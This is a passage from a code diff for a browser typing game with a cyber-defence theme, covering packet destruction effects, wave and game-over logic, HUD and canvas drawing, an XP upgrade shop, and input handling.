+    spawnParticles(pkt.x + 40, pkt.y, '#ffd700', 25, 5);
+    addShake(3);
+  } else if(pkt.type === 'multi') {
+    // Destroy all easy packets on screen
+    const kills = [];
+    for(const p of game.packets) {
+      if(p.alive && p.type === 'easy' && p !== pkt) kills.push(p);
+    }
+    kills.forEach(p => {
+      p.alive = false;
+      p.flashTimer = 0.2;
+      game.packetsDestroyed++;
+      game.score += 20;
+      spawnParticles(p.x + 20, p.y, '#f0f', 10, 3);
+    });
+    showToast('MULTI-KILL x' + (kills.length+1) + '!', 'multi');
+    AudioEngine.destroyMulti();
+    spawnParticles(pkt.x + 40, pkt.y, '#f0f', 30, 6);
+    addShake(6);
+  } else if(pkt.type === 'boss') {
+    showToast('BOSS ELIMINATED!', 'boss');
+    AudioEngine.bossDie();
+    spawnParticles(pkt.x + 60, pkt.y, '#c0f', 40, 7);
+    addShake(10);
+    game.bossesLeft--;
+  } else {
+    AudioEngine.destroy();
+    spawnParticles(pkt.x + 30, pkt.y, pkt.color, 12, 3);
+    addShake(2);
+    if(game.combo > 1 && game.combo % 5 === 0) {
+      AudioEngine.combo(game.comboMultiplier);
+      showToast('x' + game.comboMultiplier + ' COMBO!', '');
+    }
+  }
+
+  doFlash('hit');
+  updateHUD();
+  checkWaveComplete();
+}
+
+function checkWaveComplete() {
+  if(game.spawnQueue.length === 0 && game.packets.filter(p=>p.alive).length === 0) {
+    game.waveActive = false;
+    game.waveComplete = true;
+
+    // Restore honeypot for next wave
+    if(hasUpgrade('honeypot')) {
+      game.honeypotActive = true;
+    }
+
+    if(game.wave >= 10) {
+      // Victory! (still end the game but with bonus)
+      game.score += 1000;
+      showToast('SYSTEM SECURED! +1000', 'gold');
+      setTimeout(() => endGame(true), 2000);
+    } else {
+      setTimeout(() => startWave(game.wave + 1), 2500);
+    }
+  }
+}
+
+function updateRecentAccuracy(hit) {
+  game.recentHits.push(hit ? 1 : 0);
+  if(game.recentHits.length > 15) game.recentHits.shift();
+  game.recentAccuracy = game.recentHits.reduce((a,b)=>a+b,0) / game.recentHits.length;
+}
+
+// --- End Game ---
+function endGame(victory=false) {
+  game.gameOver = true;
+  game.waveActive = false;
+  AudioEngine.gameOver();
+
+  const save = getSave();
+  const baseXP = Math.floor(game.score / 10) + game.wave * 15 + game.maxCombo * 2;
+  const xpEarned = victory ? Math.floor(baseXP * 1.5) : baseXP;
+
+  const newHigh = game.score > save.highScore;
+  const newBestWave = game.wave > save.bestWave;
+
+  writeSave({
+    highScore: Math.max(save.highScore, game.score),
+    bestWave: Math.max(save.bestWave, game.wave),
+    xp: save.xp + xpEarned,
+    totalGames: save.totalGames + 1
+  });
+
+  if(gameMode === 'daily') {
+    writeSave({ dailySeed: getDailySeed(), dailyBest: Math.max(save.dailyBest, game.score) });
+  }
+
+  // Show game over screen
+  document.getElementById('go-wave').textContent = game.wave;
+  document.getElementById('go-score').textContent = game.score.toLocaleString();
+  document.getElementById('go-xp').textContent = '+' + xpEarned + ' XP';
+  const recordEl = document.getElementById('go-record');
+  if(newHigh) { recordEl.classList.remove('hidden'); recordEl.textContent = 'NEW HIGH SCORE!'; }
+  else if(newBestWave) { recordEl.classList.remove('hidden'); recordEl.textContent = 'NEW BEST WAVE!'; }
+  else recordEl.classList.add('hidden');
+
+  if(victory) {
+    document.querySelector('#gameover-screen .menu-title').textContent = 'SYSTEM SECURED';
+    document.querySelector('#gameover-screen .menu-title').style.color = '#0f0';
+    document.querySelector('#gameover-screen .menu-title').style.textShadow = '0 0 20px #0f0, 0 0 40px #0a0';
+  } else {
+    document.querySelector('#gameover-screen .menu-title').textContent = 'BREACH DETECTED';
+    document.querySelector('#gameover-screen .menu-title').style.color = '#f44';
+    document.querySelector('#gameover-screen .menu-title').style.textShadow = '0 0 20px #f44, 0 0 40px #a00';
+  }
+
+  setTimeout(() => {
+    document.getElementById('gameover-screen').classList.remove('hidden');
+  }, 800);
+}
+
+// --- HUD Update ---
+function updateHUD() {
+  if(!game) return;
+  document.getElementById('hud-wave').textContent = game.wave;
+  document.getElementById('hud-wave-name').textContent = ' ' + (WAVE_NAMES[game.wave-1] || '');
+  document.getElementById('hud-score').textContent = game.score.toLocaleString();
+
+  const comboEl = document.getElementById('hud-combo');
+  comboEl.textContent = 'x' + game.comboMultiplier + (game.combo > 1 ? ' (' + game.combo + ')' : '');
+
+  const hpEl = document.getElementById('hud-hp');
+  const hpPct = Math.max(0, Math.round(game.hp / game.maxHP * 100));
+  hpEl.textContent = hpPct + '%';
+  hpEl.className = 'hud-value' + (hpPct <= 25 ? ' danger' : '');
+
+  document.getElementById('hud-packets').textContent = game.packets.filter(p=>p.alive).length;
+  document.getElementById('hud-xp').textContent = getSave().xp;
+}
+
+// --- Drawing ---
+function draw() {
+  ctx2d.save();
+
+  // Screen shake
+  if(shakeAmount > 0.5) {
+    const sx = (Math.random()-0.5) * shakeAmount * 2;
+    const sy = (Math.random()-0.5) * shakeAmount * 2;
+    ctx2d.translate(sx, sy);
+    shakeAmount *= shakeDecay;
+  } else {
+    shakeAmount = 0;
+  }
+
+  // Background
+  ctx2d.fillStyle = '#000a00';
+  ctx2d.fillRect(0, 0, W, H);
+
+  // Grid lines (subtle)
+  ctx2d.strokeStyle = 'rgba(0,255,0,0.03)';
+  ctx2d.lineWidth = 1;
+  for(let x=0; x<W; x+=40) { ctx2d.beginPath(); ctx2d.moveTo(x,0); ctx2d.lineTo(x,H); ctx2d.stroke(); }
+  for(let y=0; y<H; y+=40) { ctx2d.beginPath(); ctx2d.moveTo(0,y); ctx2d.lineTo(W,y); ctx2d.stroke(); }
+
+  // Server (right side)
+  drawServer();
+
+  // Packets
+  if(game && !game.gameOver) {
+    for(const p of game.packets) {
+      if(!p.alive && p.flashTimer <= 0) continue;
+      drawPacket(p);
+    }
+  }
+
+  // Particles
+  drawParticles();
+
+  ctx2d.restore();
+}
+
+function drawServer() {
+  if(!game) return;
+  const sx = W - 45;
+  const sy = H/2 - 80;
+  const sw = 30;
+  const sh = 160;
+
+  // Server body
+  const hpRatio = game.hp / game.maxHP;
+  const serverColor = hpRatio > 0.5 ? '#0f0' : hpRatio > 0.25 ? '#ff0' : '#f44';
+
+  ctx2d.strokeStyle = serverColor;
+  ctx2d.lineWidth = 2;
+  ctx2d.strokeRect(sx, sy, sw, sh);
+
+  // HP bar fill
+  const fillH = sh * hpRatio;
+  ctx2d.fillStyle = serverColor + '40';
+  ctx2d.fillRect(sx+1, sy + sh - fillH, sw-2, fillH);
+
+  // Server label
+  ctx2d.fillStyle = serverColor;
+  ctx2d.font = '10px "Share Tech Mono"';
+  ctx2d.textAlign = 'center';
+  ctx2d.fillText('SRV', sx + sw/2, sy - 8);
+
+  // Blinking LED
+  if(Math.floor(Date.now()/500) % 2 === 0) {
+    ctx2d.fillStyle = serverColor;
+    ctx2d.fillRect(sx + sw/2 - 3, sy + 10, 6, 4);
+  }
+
+  // Server line (defense perimeter)
+  ctx2d.strokeStyle = serverColor + '30';
+  ctx2d.lineWidth = 1;
+  ctx2d.setLineDash([4,8]);
+  ctx2d.beginPath();
+  ctx2d.moveTo(W-60, 0);
+  ctx2d.lineTo(W-60, H);
+  ctx2d.stroke();
+  ctx2d.setLineDash([]);
+
+  // Honeypot indicator
+  if(game.honeypotActive && !game.honeypotUsed) {
+    ctx2d.fillStyle = '#0f0';
+    ctx2d.font = '9px "Share Tech Mono"';
+    ctx2d.fillText('HPT', sx + sw/2, sy + sh + 16);
+  }
+}
+
+function drawPacket(p) {
+  const isFlashing = !p.alive && p.flashTimer > 0;
+  ctx2d.save();
+
+  if(isFlashing) {
+    ctx2d.globalAlpha = p.flashTimer / 0.3;
+  }
+
+  const fontSize = p.type === 'boss' ? 14 : p.type === 'hard' ? 13 : 14;
+  ctx2d.font = fontSize + 'px "Share Tech Mono"';
+
+  const textMetrics = ctx2d.measureText(p.text);
+  p.width = textMetrics.width + 24;
+  const pktH = 28;
+  const px = p.x;
+  const py = p.y;
+
+  // Packet background
+  const bgAlpha = isFlashing ? '80' : '30';
+  ctx2d.fillStyle = p.color + bgAlpha;
+  ctx2d.fillRect(px, py - pktH/2, p.width, pktH);
+
+  // Border
+  ctx2d.strokeStyle = p.color + (isFlashing ? 'ff' : '80');
+  ctx2d.lineWidth = p.highlighted ? 2 : 1;
+  ctx2d.strokeRect(px, py - pktH/2, p.width, pktH);
+
+  // IDS highlight
+  if(p.highlighted && !isFlashing) {
+    ctx2d.strokeStyle = '#ff0';
+    ctx2d.lineWidth = 2;
+    ctx2d.setLineDash([3,3]);
+    ctx2d.strokeRect(px-3, py - pktH/2 - 3, p.width+6, pktH+6);
+    ctx2d.setLineDash([]);
+
+    // IDS label
+    ctx2d.fillStyle = '#ff0';
+    ctx2d.font = '9px "Share Tech Mono"';
+    ctx2d.textAlign = 'left';
+    ctx2d.fillText('>> PRIORITY', px, py - pktH/2 - 6);
+  }
+
+  // DPI: show type label before fully visible
+  if(hasUpgrade('dpi') && p.x < 80) {
+    ctx2d.fillStyle = '#0a0';
+    ctx2d.font = '9px "Share Tech Mono"';
+    ctx2d.textAlign = 'left';
+    const typeLabel = p.type.toUpperCase();
+    ctx2d.fillText('[' + typeLabel + ']', px, py - pktH/2 - 6);
+  }
+
+  // Packet text with match highlighting
+  ctx2d.textAlign = 'left';
+  ctx2d.textBaseline = 'middle';
+
+  // Matched portion
+  if(p.matched > 0) {
+    const matchedText = p.text.substring(0, p.matched);
+    const remainText = p.text.substring(p.matched);
+    ctx2d.fillStyle = '#000';
+    const mw = ctx2d.measureText(matchedText).width;
+    ctx2d.fillRect(px + 12, py - pktH/2 + 2, mw, pktH - 4);
+    ctx2d.fillStyle = p.type === 'boss' ? '#fff' : '#0f0';
+    ctx2d.font = 'bold ' + fontSize + 'px "Share Tech Mono"';
+    ctx2d.fillText(matchedText, px + 12, py);
+    ctx2d.font = fontSize + 'px "Share Tech Mono"';
+    ctx2d.fillStyle = p.color;
+    ctx2d.fillText(remainText, px + 12 + mw, py);
+  } else {
+    ctx2d.fillStyle = p.color;
+    ctx2d.font = fontSize + 'px "Share Tech Mono"';
+    ctx2d.fillText(p.text, px + 12, py);
+  }
+
+  // Type icon for special packets
+  if(p.type === 'gold' && !isFlashing) {
+    ctx2d.fillStyle = '#ffd700';
+    ctx2d.font = '10px "Share Tech Mono"';
+    ctx2d.fillText('$$$', px + p.width + 4, py);
+  }
+  if(p.type === 'multi' && !isFlashing) {
+    ctx2d.fillStyle = '#f0f';
+    ctx2d.font = '10px "Share Tech Mono"';
+    ctx2d.fillText('***', px + p.width + 4, py);
+  }
+  if(p.type === 'boss' && !isFlashing) {
+    ctx2d.fillStyle = '#c0f';
+    ctx2d.font = '10px "Share Tech Mono"';
+    ctx2d.fillText('[BOSS]', px + p.width + 4, py);
+  }
+
+  ctx2d.restore();
+}
+
+// --- Main Loop ---
+function gameLoop(timestamp) {
+  animFrame = requestAnimationFrame(gameLoop);
+
+  const dt = Math.min((timestamp - lastTime) / 1000, 0.05); // cap at 50ms
+  lastTime = timestamp;
+
+  if(game && !game.gameOver && !game.paused) {
+    game.elapsedTime += dt;
+    updateSpawning(dt);
+    updatePackets(dt);
+    updateParticles(dt);
+
+    // Periodic IDS update
+    if(hasUpgrade('ids') && Math.floor(game.elapsedTime * 4) % 2 === 0) {
+      updateIDSTarget();
+    }
+  } else {
+    updateParticles(dt);
+  }
+
+  draw();
+}
+
+// --- UI Wiring ---
+function showScreen(id) {
+  ['title-screen','shop-screen','gameover-screen'].forEach(s => {
+    document.getElementById(s).classList.add('hidden');
+  });
+  if(id) document.getElementById(id).classList.remove('hidden');
+}
+
+function updateTitleStats() {
+  const save = getSave();
+  document.getElementById('title-highscore').textContent = save.highScore.toLocaleString();
+  document.getElementById('title-bestwave').textContent = save.bestWave;
+  document.getElementById('title-xp').textContent = save.xp;
+}
+
+function buildUpgradeShop() {
+  const save = getSave();
+  const grid = document.getElementById('upgrades-grid');
+  grid.innerHTML = '';
+  document.getElementById('shop-xp').textContent = save.xp;
+
+  UPGRADE_DEFS.forEach(u => {
+    const owned = save.upgrades.includes(u.id);
+    const canAfford = save.xp >= u.cost;
+    const card = document.createElement('div');
+    card.className = 'upgrade-card' + (owned ? ' owned' : '');
+    card.innerHTML = `
+      <div class="upgrade-name">${u.icon} ${u.name}</div>
+      <div class="upgrade-desc">${u.desc}</div>
+      <div class="upgrade-cost">${owned ? 'INSTALLED' : u.cost + ' XP'}</div>
+    `;
+    if(!owned && canAfford) {
+      card.style.cursor = 'pointer';
+      card.addEventListener('click', () => {
+        const s = getSave();
+        if(s.xp >= u.cost && !s.upgrades.includes(u.id)) {
+          const upg = [...s.upgrades, u.id];
+          writeSave({ xp: s.xp - u.cost, upgrades: upg });
+          AudioEngine.upgrade();
+          showToast(u.name + ' INSTALLED!', '');
+          buildUpgradeShop();
+        }
+      });
+    } else if(!owned) {
+      card.style.opacity = '0.4';
+      card.style.cursor = 'not-allowed';
+    }
+    grid.appendChild(card);
+  });
+}
+
+// Button handlers
+document.getElementById('btn-start').addEventListener('click', () => {
+  showScreen(null);
+  AudioEngine.init();
+  initGame(false);
+  inputEl.focus();
+});
+
+document.getElementById('btn-daily').addEventListener('click', () => {
+  showScreen(null);
+  AudioEngine.init();
+  initGame(true);
+  inputEl.focus();
+});
+
+document.getElementById('btn-upgrades').addEventListener('click', () => {
+  buildUpgradeShop();
+  showScreen('shop-screen');
+});
+
+document.getElementById('btn-shop-back').addEventListener('click', () => {
+  updateTitleStats();
+  showScreen('title-screen');
+});
+
+document.getElementById('btn-retry').addEventListener('click', () => {
+  showScreen(null);
+  initGame(gameMode === 'daily');
+  inputEl.focus();
+});
+
+document.getElementById('btn-go-upgrades').addEventListener('click', () => {
+  buildUpgradeShop();
+  showScreen('shop-screen');
+});
+
+document.getElementById('btn-go-menu').addEventListener('click', () => {
+  updateTitleStats();
+  showScreen('title-screen');
+});
+
+// Input
+inputEl.addEventListener('input', onInput);
+inputEl.addEventListener('keydown', (e) => {
+  if(e.key === 'Escape') {
+    inputEl.value = '';
+    game && game.packets.forEach(p => { p.matched = p.autoTyped ? Math.min(2, p.text.length) : 0; });
+  }
+  // Mute toggle
+  if(e.key === 'F1') {
+    e.preventDefault();
+    const m = AudioEngine.toggleMute();
+    writeSave({ muted: m });
+    showToast(m ? 'SOUND OFF' : 'SOUND ON', '');
+  }
+});
+
+// Keep focus on input
+document.addEventListener('click', (e) => {
+  if(!e.target.closest('.menu-screen') && !e.target.closest('.upgrade-card')) {
+    inputEl.focus();
+  }
+});
+
+// Prevent zoom on mobile
+document.addEventListener('gesturestart', e => e.preventDefault());
+
+// Handle mobile keyboard resize — shrink canvas so packets stay visible
+if(window.visualViewport) {
+  window.visualViewport.addEventListener('resize', () => {
+    H = window.visualViewport.height;
+    canvas.height = H * DPR;
+    ctx2d.setTransform(DPR, 0, 0, DPR, 0, 0);
+  });
+}
+
+// Keep input focused during gameplay
+setInterval(() => {
+  if(game && !game.gameOver && game.waveActive && document.activeElement !== inputEl) {
+    const menus = document.querySelectorAll('.menu-screen:not(.hidden)');
+    if(menus.length === 0) inputEl.focus();
+  }
+}, 500);
+
+// --- Init ---
+updateTitleStats();
+showScreen('title-screen');
+lastTime = performance.now();
+gameLoop(lastTime);
+
+// Apply saved mute state
+const savedMute = getSave().muted;
+if(savedMute === false) {
+  AudioEngine.init();
+  AudioEngine.toggleMute(); // unmute
+}
+</script>
+</body>
+</html>
